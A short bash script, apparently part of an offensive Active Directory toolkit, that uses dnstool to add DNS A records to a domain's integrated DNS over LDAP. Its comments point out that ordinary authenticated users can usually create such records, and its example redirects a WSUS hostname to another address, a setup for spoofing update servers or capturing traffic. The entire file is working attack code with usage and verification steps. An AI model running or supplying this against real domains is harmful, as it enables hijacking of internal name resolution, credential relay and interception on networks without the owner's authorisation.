#!/bin/bash
# adidns_add.sh — add a DNS A record via LDAP (ADIDNS).
# Authenticated Users usually have CreateChild on the zone → can ADD new records
# (but not modify existing ones).
#
# Usage: adidns_add.sh <dc_ip> <record_name> <target_ip> -u DOMAIN\\user -p password
#                                                        [-k]  # use KRB5CCNAME
#
# Example:  adidns_add.sh 10.10.10.5 wsus.corp.local 10.10.14.20 -u 'CORP\alice' -p Pass123
set -euo pipefail
DC="${1:?DC IP}"
RECORD="${2:?record name e.g. wsus.corp.local}"
TARGET="${3:?target IP to point to}"
shift 3
dnstool -r "$RECORD" -d "$TARGET" -a add "$@" "$DC"
echo "[+] Added. May take up to 3 min for Windows DNS cache to refresh."
echo "[+] Verify:  nslookup $RECORD $DC"
